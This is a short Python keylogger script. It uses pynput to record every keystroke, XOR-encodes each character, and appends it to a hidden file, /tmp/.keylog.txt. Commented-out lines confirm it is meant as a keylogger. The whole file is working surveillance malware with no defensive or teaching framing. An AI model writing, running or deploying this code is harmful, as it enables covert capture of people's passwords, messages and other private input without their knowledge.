from pynput.keyboard import Listener
import os
log_file = "/tmp/.keylog.txt"
key = 0x42

if not os.path.exists(log_file):
    open(log_file,"w").close()
    
def xor_encrypt(char):
    return chr(ord(char)^key)

def on_press(k):
    try:
        c = k.char
    except:
        c = f"[{k}]"

    encrypted = "".join([xor_encrypt(x) for x in c])

    with open(log_file,"a") as f:
        f.write(encrypted)

with Listener(on_press=on_press) as listener:
    listener.join()



# try:
#     with Listener(on_press=on_press) as listener:
#         listener.join()
# except KeyboardInterrupt:
#     print("Keylogger stopped by user.")

# print("Now doing next part of the code...")